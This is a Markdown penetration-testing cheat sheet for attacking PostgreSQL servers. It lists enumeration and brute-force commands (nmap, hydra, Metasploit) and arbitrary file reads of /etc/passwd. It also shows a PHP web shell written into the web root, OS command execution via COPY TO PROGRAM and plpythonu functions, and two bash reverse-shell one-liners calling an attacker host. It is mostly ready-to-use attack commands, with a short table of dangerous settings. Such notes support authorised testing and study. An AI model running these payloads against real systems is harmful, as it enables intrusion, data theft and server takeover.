#PostgreSQL #Postgres #database #RDBMS

## What is PostgreSQL?
Open-source relational DBMS. Feature-rich alternative to MySQL/MSSQL. Supports stored procedures in multiple languages (PL/pgSQL, PL/Python, PL/Perl). Superuser can achieve OS command execution via `COPY ... FROM PROGRAM`.

- Port: **TCP 5432** (default)
- Config: `/etc/postgresql/<version>/main/postgresql.conf`
- Auth config: `/etc/postgresql/<version>/main/pg_hba.conf`
- Default superuser: `postgres`

---

## Default Databases

| Database | Description |
|---|---|
| `postgres` | Default admin database |
| `template0` | Pristine template, never modified |
| `template1` | Template for new databases |

---

## Enumeration

```bash
# Nmap
nmap -p 5432 --script pgsql-brute,banner -sV <target>

# Check if accessible
psql -h <target> -U postgres -c "\l"

# Metasploit
use auxiliary/scanner/postgres/postgres_login
use auxiliary/admin/postgres/postgres_sql
use auxiliary/scanner/postgres/postgres_schemadump
```

---

## Connect / Access

```bash
# psql client (Linux)
psql -h <target> -U <user> -d <database>
psql -h <target> -U postgres                  # default superuser, no password
psql -h <target> -U postgres -W               # prompt for password
psql "postgresql://<user>:<pass>@<target>/<db>"

# Run single query
psql -h <target> -U postgres -c "SELECT version();"
psql -h <target> -U postgres -d postgres -c "\l"

# Windows (if psql installed)
psql.exe -h <target> -U postgres
```

---

## Key SQL Commands

```sql
-- Version info
SELECT version();

-- Current user + privilege check
SELECT current_user;
SELECT session_user;
SELECT pg_postmaster_start_time();

-- Is superuser?
SELECT usesuper FROM pg_user WHERE usename = current_user;
SELECT current_setting('is_superuser');

-- List databases
\l
SELECT datname FROM pg_database;

-- List schemas
\dn
SELECT schema_name FROM information_schema.schemata;

-- List tables
\dt
\dt *.*
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';

-- List users
\du
SELECT usename, usesuper, usecreatedb FROM pg_user;

-- Switch database (psql meta-command)
\c <database>

-- List installed extensions
SELECT * FROM pg_extension;

-- Check installed languages
SELECT lanname FROM pg_language;
```

---

## Attack Vectors

### File Read — pg_read_file (superuser only)

```sql
-- Read arbitrary file (superuser required)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/postgresql/14/main/pg_hba.conf');

-- Read binary file
SELECT encode(pg_read_binary_file('/etc/passwd'), 'escape');
```

### File Read — COPY TO

```sql
-- Read file into table
CREATE TABLE tmp_read (data TEXT);
COPY tmp_read FROM '/etc/passwd';
SELECT * FROM tmp_read;
DROP TABLE tmp_read;
```

### File Write — COPY TO (superuser)

```sql
-- Write file from table
CREATE TABLE tmp_write (data TEXT);
INSERT INTO tmp_write VALUES ('<?php system($_GET["cmd"]); ?>');
COPY tmp_write TO '/var/www/html/shell.php';
DROP TABLE tmp_write;
```

### RCE — COPY FROM PROGRAM (superuser, PostgreSQL 9.3+)

```sql
-- OS command execution
COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';

-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1''';

-- Via table (alternative form)
CREATE TABLE cmd_output (output TEXT);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
```

### RCE — UDF via Untrusted Language (superuser)

```sql
-- Enable plpythonu (if available)
CREATE LANGUAGE plpythonu;

CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS TEXT AS $$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpythonu;

SELECT exec_cmd('id');
SELECT exec_cmd('bash -c ''bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1''');
```

### pg_hba.conf Trust Auth

```bash
# If pg_hba.conf has: local/host all all trust
# No password required for matching connections
psql -h <target> -U postgres   # no password needed
```

### Brute Force

```bash
hydra -L users.txt -P passwords.txt postgres://<target>

# Metasploit
use auxiliary/scanner/postgres/postgres_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Nmap
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt <target>
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Superuser with weak/default password | RCE via COPY FROM PROGRAM |
| `pg_hba.conf` trust entries | No-password auth for matching hosts |
| `listen_addresses = '*'` | Exposed to network |
| plpythonu/plperlu installed | UDF-based RCE |
| `log_connections = off` | No audit trail |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect | `psql -h host -U postgres` |
| List databases | `\l` or `SELECT datname FROM pg_database` |
| Current user | `SELECT current_user` |
| Is superuser? | `SELECT current_setting('is_superuser')` |
| Read file | `SELECT pg_read_file('/etc/passwd')` |
| RCE | `COPY (SELECT '') TO PROGRAM 'id'` |
| Write shell | `COPY tmp TO '/var/www/html/shell.php'` |
| Brute force | `hydra -L users.txt -P pass.txt postgres://host` |
| Nmap enum | `nmap -p 5432 --script pgsql-brute host` |
